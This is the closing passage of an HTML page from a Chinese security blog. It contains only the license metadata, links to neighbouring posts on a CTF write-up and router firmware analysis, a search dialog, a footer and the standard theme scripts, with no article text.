      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年3月27日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="../../../08/26/2024NepCTFwriteup/" title="2024NepCTFwriteup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2024NepCTFwriteup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="../../../02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/" title="TL-WR886N路由器uart调试及VxWorks固件提取和分析">
                        <span class="hidden-mobile">TL-WR886N路由器uart调试及VxWorks固件提取和分析</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href=""><span>fffer</span></a> <i class="iconfont icon-bug"></i> <a href="" target="_blank" rel="nofollow noopener"><span>0p1n</span></a> <br /> <a href=""><span>富强 民主 文明 和谐 自由 平等 公正 法治 爱国 敬业 诚信 友善</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="../../../../js/events.js" ></script>
<script  src="../../../../js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="../../../../js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="../../../../js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="../../../../js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
